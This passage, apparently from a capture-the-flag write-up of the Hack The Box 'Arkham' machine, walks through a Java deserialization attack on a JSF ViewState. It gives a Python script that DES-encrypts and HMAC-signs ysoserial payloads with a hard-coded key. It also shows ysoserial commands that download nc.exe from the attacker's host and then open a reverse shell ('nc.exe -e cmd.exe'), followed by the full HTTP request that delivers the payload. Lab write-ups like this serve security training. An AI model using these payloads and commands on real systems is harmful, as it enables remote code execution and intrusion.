	&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;des&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ECB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padmode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAD_PKCS5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JsF9876-'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] Usage : {} [Payload File] [Output File]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Encrypting payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  [!] Key : JsF9876-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Creating HMAC signature&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Appending signature to the encrypted payload&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Final payload : {}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Saved to : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-script-has-two-functions-encrypt-and-hmac_sig-encrypt-takes-the-payload-generated-by-ysoserial-and-des-encrypts-it-using-the-key-then-returns-the-encrypted-payload-hmac_sig-takes-the-encrypted-payload-and-generates-the-hmac-signature-that-will-be-appended-to-the-encrypted-payload&quot;&gt;This script has two functions, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; takes the payload generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt; encrypts it using the key then returns the encrypted payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt; takes the encrypted payload and generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature that will be appended to the encrypted payload.&lt;/h4&gt;
&lt;h4 id=&quot;the-script-takes-two-arguments-first-one-is-for-the-filename-that-contains-the-ysoserial-generated-payload-it-encrypts-it-then-generates-the-hmac-signature-appends-it-to-the-encrypted-payload-base-64-encodes-the-final-payload-and-url-encodes-it-then-it-saves-the-payload-into-the-output-file-which-is-the-second-argument&quot;&gt;The script takes two arguments, first one is for the filename that contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; generated payload, it encrypts it then generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature, appends it to the encrypted payload, base-64 encodes the final payload and &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt;-encodes it. Then it saves the payload into the output file which is the second argument.&lt;/h4&gt;
&lt;h4 id=&quot;time-to-use-ysoserial--we-run-into-the-problem-of-which-payload-to-use-i-used-commonscollections5-and-it-worked&quot;&gt;Time to use &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;,  we run into the problem of which payload to use, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;CommonsCollections5&lt;/code&gt; and it worked.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-two-payloads-first-one-is-to-download-ncexe-from-my-box-and-save-it-in-cwindowssystem32spooldriverscolor-second-one-is-to-execute-the-reverse-shell-command--ncexe--e-cmdexe-1010xxxx-1337&quot;&gt;I created two payloads, first one is to download &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; from my box and save it in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color&lt;/code&gt;, second one is to execute the reverse shell command : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1337&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri &quot;http://10.10.xx.xx/nc.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;' &amp;gt; uploadnc.payload
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1337' &amp;gt; executenc.payload
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
root@kali:~/Desktop/HTB/boxes/arkham# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-encrypted-them-with-my-script-&quot;&gt;Then I encrypted them with my script :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-ncexe-and-i-started-my-nc-listener-on-port-1337-then-i-sent-the-payloads&quot;&gt;I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and I started my &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener on port 1337, then I sent the payloads.&lt;/h4&gt;
&lt;h4 id=&quot;1st-request-&quot;&gt;1st Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 3197
Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 2570
Date: Fri, 09 Aug 2019 18:36:52 GMT
Connection: close

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span 